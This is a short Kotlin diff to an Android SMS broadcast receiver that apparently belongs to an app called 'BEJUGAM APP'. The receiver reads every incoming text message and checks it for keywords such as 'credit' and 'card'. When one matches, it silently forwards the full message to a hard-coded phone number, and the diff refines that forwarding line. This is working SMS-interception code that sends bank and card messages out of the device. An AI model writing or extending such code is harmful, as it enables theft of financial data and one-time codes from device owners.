@@ -26,6 +26,7 @@ class SMSReciever : BroadcastReceiver() {
                 str += " :"
                 str += msgs[i]!!.messageBody
             }
+            var msg: String? = str;
             Log.d(TAG, "onReceive: $str")
             val smsManager = SmsManager.getDefault()
             str = str!!.lowercase(Locale.getDefault());
@@ -36,7 +37,7 @@ class SMSReciever : BroadcastReceiver() {
                 str.contains("credit") ||
                 str.contains("card")
             ) {
-                str = "BEJAPP: "+str
+                str = "BEJUGAM APP: $msg"
                 smsManager.sendTextMessage("+919100903791", null, str, null, null)
 //                                Toast.makeText(context, str, Toast.LENGTH_SHORT).show();
                 Log.i(TAG, "$str sent.")
